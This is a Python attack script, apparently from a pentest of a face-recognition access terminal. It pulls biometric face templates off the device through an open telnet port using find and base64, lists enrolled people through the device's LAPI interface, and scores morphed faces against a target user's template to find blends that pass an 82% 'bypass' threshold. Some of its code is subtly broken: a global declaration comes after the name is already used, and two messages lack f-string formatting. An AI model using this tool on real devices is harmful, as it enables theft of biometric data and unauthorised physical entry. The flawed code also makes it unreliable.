#!/usr/bin/env python3
"""
Analyze morph templates to find bypass threshold.

Extracts templates for all enrolled morphs and computes similarity
to the target user's template to identify which blend ratios (α values)
achieve >= 82% similarity for authentication bypass.

Usage:
    python3 SCRIPTS/analyze_morphs.py --extract    # Extract templates from device
    python3 SCRIPTS/analyze_morphs.py --analyze    # Analyze extracted templates
    python3 SCRIPTS/analyze_morphs.py --all        # Both extract and analyze
"""

import argparse
import base64
import json
import socket
import struct
import sys
import time
import numpy as np
from pathlib import Path
from typing import Optional, List, Tuple

# Configuration
DEVICE_IP = "192.168.30.178"
LIB_ID = 3  # Employee library (where morphs are enrolled)
TELNET_PORT = 2323
BYPASS_THRESHOLD = 0.82

# Template format
HEADER_SIZE = 20
EMBEDDING_DIM = 256
TEMPLATE_SIZE = HEADER_SIZE + EMBEDDING_DIM * 4  # 1044 bytes


def telnet_command(device_ip: str, command: str, timeout: float = 10.0) -> str:
    """Execute command via telnet and return output."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((device_ip, TELNET_PORT))

        time.sleep(0.3)
        sock.recv(4096)  # Discard banner

        sock.send(f"{command}\n".encode())
        time.sleep(0.5)

        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if len(response) > 500000:
                    break
            except socket.timeout:
                break

        sock.close()
        return response.decode('utf-8', errors='ignore')

    except Exception as e:
        print(f"[!] Telnet error: {e}")
        return ""


def find_morph_templates(device_ip: str, lib_id: int) -> List[Tuple[str, str]]:
    """Find all morph templates on device."""
    # List PersonID directories
    cmd = f"ls -la /data/WorkLibFile/{lib_id}/"
    output = telnet_command(device_ip, cmd)

    # Find morph-related entries (look for PersonID directories in the 70000 range)
    morph_entries = []

    # List all FaceID files
    cmd = f"find /data/WorkLibFile/{lib_id} -name 'FaceID_*.bin' 2>/dev/null"
    output = telnet_command(device_ip, cmd, timeout=30)

    for line in output.split('\n'):
        line = line.strip()
        if '.bin' in line and 'FaceID' in line:
            morph_entries.append(line)

    return morph_entries


def extract_template(device_ip: str, template_path: str) -> Optional[bytes]:
    """Extract a single template file via telnet base64."""
    cmd = f"base64 {template_path}"
    output = telnet_command(device_ip, cmd, timeout=15)

    # Parse base64 data
    b64_lines = []
    in_data = False
    for line in output.split('\n'):
        line = line.strip()
        if not line:
            continue
        if 'base64' in line or line.startswith('#') or line.startswith('/'):
            in_data = True
            continue
        if in_data and line and not line.startswith('~'):
            # Filter out shell prompts and command echoes
            if len(line) > 10 and line[0].isalnum():
                b64_lines.append(line)

    b64_data = ''.join(b64_lines)

    try:
        return base64.b64decode(b64_data)
    except Exception as e:
        print(f"[!] Base64 decode error for {template_path}: {e}")
        return None


def load_template_embedding(template_data: bytes) -> Optional[np.ndarray]:
    """Extract 256-float embedding from template data."""
    if len(template_data) != TEMPLATE_SIZE:
        return None

    embedding_data = template_data[HEADER_SIZE:]
    embedding = np.frombuffer(embedding_data, dtype=np.float32).copy()

    if len(embedding) != EMBEDDING_DIM:
        return None

    return embedding


def compute_similarity(emb1: np.ndarray, emb2: np.ndarray) -> float:
    """Compute cosine similarity between two embeddings."""
    norm1 = np.linalg.norm(emb1)
    norm2 = np.linalg.norm(emb2)

    if norm1 == 0 or norm2 == 0:
        return 0.0

    return float(np.dot(emb1 / norm1, emb2 / norm2))


def extract_all_morph_templates(device_ip: str, output_dir: Path, lib_id: int = LIB_ID):
    """Extract templates for all morph entries from device."""
    output_dir.mkdir(parents=True, exist_ok=True)

    print(f"[*] Finding morph templates on device...")

    # Find all templates (we'll identify morphs by PersonID range 70000-70100)
    # First, list all person info via LAPI to map names to FaceIDs

    # For now, find all FaceIDs and extract them
    templates_found = find_morph_templates(device_ip, lib_id)
    print(f"[+] Found {len(templates_found)} template files")

    extracted = 0
    for template_path in templates_found:
        # Extract FaceID from path
        # Path format: /data/WorkLibFile/3/PersonID_xxxxx/FaceID_yyyyy.bin
        try:
            face_id = template_path.split('FaceID_')[1].replace('.bin', '')
        except:
            continue

        print(f"[*] Extracting FaceID {face_id}...")
        template_data = extract_template(device_ip, template_path)

        if template_data and len(template_data) == TEMPLATE_SIZE:
            output_path = output_dir / f"FaceID_{face_id}.bin"
            output_path.write_bytes(template_data)
            extracted += 1
            print(f"    -> Saved to {output_path}")
        else:
            print(f"    -> FAILED (invalid data)")

    print(f"\n[+] Extracted {extracted} templates to {output_dir}")
    return extracted


def extract_morphs_by_name(device_ip: str, output_dir: Path, lib_id: int = LIB_ID):
    """
    Extract templates for morph entries specifically.
    Uses LAPI to find entries with names matching morph_XXX pattern.
    """
    import urllib.request

    output_dir.mkdir(parents=True, exist_ok=True)

    # Query LAPI for all people in the library
    url = f"http://{device_ip}/LAPI/V1.0/PeopleLibraries/{lib_id}/People"

    try:
        response = urllib.request.urlopen(url, timeout=30)
        data = json.loads(response.read().decode('utf-8'))
    except Exception as e:
        print(f"[!] LAPI query failed: {e}")
        return 0

    # Parse person list
    people = data.get('Response', {}).get('Data', {}).get('PersonList', [])
    if not people:
        people = data.get('PersonList', [])

    morph_count = 0
    extracted = 0

    for person in people:
        name = person.get('PersonName', '')
        person_id = person.get('PersonID', '')

        # Check if this is a morph entry
        if name.startswith('morph_') and name[6:].isdigit():
            morph_count += 1
            pct = int(name[6:])

            # Find and extract template for this person
            find_cmd = f"find /data/WorkLibFile/{lib_id}/PersonID_{person_id} -name 'FaceID_*.bin' 2>/dev/null"
            result = telnet_command(device_ip, find_cmd)

            template_paths = [l.strip() for l in result.split('\n') if '.bin' in l and 'FaceID' in l]

            if template_paths:
                template_path = template_paths[0]
                print(f"[*] Extracting {name} (PersonID {person_id})...")

                template_data = extract_template(device_ip, template_path)

                if template_data and len(template_data) == TEMPLATE_SIZE:
                    output_path = output_dir / f"morph_{pct:03d}.bin"
                    output_path.write_bytes(template_data)
                    extracted += 1
                    print(f"    -> {output_path}")
                else:
                    print(f"    -> FAILED")
            else:
                print(f"[!] No template found for {name}")

    print(f"\n[+] Found {morph_count} morph entries, extracted {extracted} templates")
    return extracted


def analyze_morph_similarities(templates_dir: Path, target_template_path: Path):
    """
    Analyze similarity of all morph templates to target.
    Produces a similarity curve and identifies bypass candidates.
    """
    # Load target template
    target_data = target_template_path.read_bytes()
    target_emb = load_template_embedding(target_data)

    if target_emb is None:
        print(f"[!] Failed to load target template: {target_template_path}")
        return

    print(f"[+] Loaded target template ({EMBEDDING_DIM} dims)")
    print(f"[+] Target norm: {np.linalg.norm(target_emb):.4f}")

    # Analyze each morph template
    results = []

    for pct in range(101):
        template_path = templates_dir / f"morph_{pct:03d}.bin"

        if not template_path.exists():
            continue

        template_data = template_path.read_bytes()
        morph_emb = load_template_embedding(template_data)

        if morph_emb is None:
            print(f"[!] Failed to load morph_{pct:03d}.bin")
            continue

        sim = compute_similarity(morph_emb, target_emb)
        results.append((pct, sim))

        status = "PASS" if sim >= BYPASS_THRESHOLD else ""
        bar = "=" * int(sim * 50)
        print(f"α={pct:3d}%: {sim:.4f} [{bar:<50}] {status}")

    if not results:
        print("[!] No morph templates found to analyze")
        return

    # Summary
    print("\n" + "=" * 60)
    print("ANALYSIS SUMMARY")
    print("=" * 60)

    passing = [(p, s) for p, s in results if s >= BYPASS_THRESHOLD]
    failing = [(p, s) for p, s in results if s < BYPASS_THRESHOLD]

    print(f"\nTotal morphs analyzed: {len(results)}")
    print(f"Bypass threshold: {BYPASS_THRESHOLD:.2f} ({BYPASS_THRESHOLD*100:.0f}%)")
    print(f"Passing morphs: {len(passing)}")
    print(f"Failing morphs: {len(failing)}")

    if passing:
        print("\n" + "=" * 60)
        print("BYPASS CANDIDATES (α where similarity >= threshold)")
        print("=" * 60)
        for pct, sim in passing:
            print(f"  morph_{pct:03d} (α={pct}%): {sim:.4f} ({sim*100:.2f}%)")

        best = max(passing, key=lambda x: x[1])
        print(f"\n[BEST] morph_{best[0]:03d} with {best[1]:.4f} similarity")

        # Find transition point
        sorted_results = sorted(results, key=lambda x: x[0])
        for i in range(len(sorted_results) - 1):
            curr_pct, curr_sim = sorted_results[i]
            next_pct, next_sim = sorted_results[i + 1]

            if curr_sim >= BYPASS_THRESHOLD and next_sim < BYPASS_THRESHOLD:
                print(f"\n[THRESHOLD] Bypass fails after α={curr_pct}%")
                print(f"            (morph_{curr_pct:03d}={curr_sim:.4f}, morph_{next_pct:03d}={next_sim:.4f})")
                break

    else:
        print("\n[NO BYPASS] No morph achieved >= {BYPASS_THRESHOLD:.0%} similarity")
        if results:
            best = max(results, key=lambda x: x[1])
            print(f"[CLOSEST] morph_{best[0]:03d} with {best[1]:.4f} ({best[1]*100:.2f}%)")
            deficit = BYPASS_THRESHOLD - best[1]
            print(f"          Need {deficit:.4f} more similarity to bypass")

    # Export results to CSV
    csv_path = templates_dir.parent / "morph_analysis_results.csv"
    with open(csv_path, 'w') as f:
        f.write("alpha_pct,similarity,bypass\n")
        for pct, sim in sorted(results):
            f.write(f"{pct},{sim:.6f},{1 if sim >= BYPASS_THRESHOLD else 0}\n")
    print(f"\n[+] Results saved to {csv_path}")

    return results


def main():
    parser = argparse.ArgumentParser(description="Analyze morph templates for bypass threshold")
    parser.add_argument("--device", default=DEVICE_IP, help="Device IP address")
    parser.add_argument("--lib", type=int, default=LIB_ID, help="Library ID")
    parser.add_argument("--extract", action="store_true", help="Extract templates from device")
    parser.add_argument("--analyze", action="store_true", help="Analyze extracted templates")
    parser.add_argument("--all", action="store_true", help="Both extract and analyze")
    parser.add_argument("--target", type=str, help="Path to target user template")
    parser.add_argument("--templates-dir", type=str, help="Directory for morph templates")
    parser.add_argument("--threshold", type=float, default=BYPASS_THRESHOLD,
                       help="Bypass similarity threshold (default: 0.82)")
    args = parser.parse_args()

    global BYPASS_THRESHOLD
    BYPASS_THRESHOLD = args.threshold

    project_dir = Path(__file__).parent.parent
    templates_dir = Path(args.templates_dir) if args.templates_dir else project_dir / "EXHAUSTIVE_TEMPLATES"
    target_path = Path(args.target) if args.target else project_dir / "user_target_template.bin"

    if args.all:
        args.extract = True
        args.analyze = True

    if not args.extract and not args.analyze:
        parser.print_help()
        print("\nSpecify --extract, --analyze, or --all")
        return

    if args.extract:
        print("=" * 60)
        print("TEMPLATE EXTRACTION")
        print("=" * 60)
        print(f"Device: {args.device}")
        print(f"Library: {args.lib}")
        print(f"Output: {templates_dir}")
        print("=" * 60)

        extracted = extract_morphs_by_name(args.device, templates_dir, args.lib)

        if extracted == 0:
            print("\n[!] No templates extracted. Check:")
            print("    1. Device is reachable")
            print("    2. Morphs are enrolled in library {args.lib}")
            print("    3. Entry names match pattern 'morph_XXX'")

    if args.analyze:
        print("\n" + "=" * 60)
        print("SIMILARITY ANALYSIS")
        print("=" * 60)

        if not target_path.exists():
            print(f"[!] Target template not found: {target_path}")
            print("\nExtract target template first:")
            print(f"  python3 SCRIPTS/adversarial_oracle.py --extract-template <FACE_ID> --output {target_path}")
            return

        if not templates_dir.exists():
            print(f"[!] Templates directory not found: {templates_dir}")
            print("\nExtract morph templates first with --extract")
            return

        analyze_morph_similarities(templates_dir, target_path)


if __name__ == "__main__":
    main()
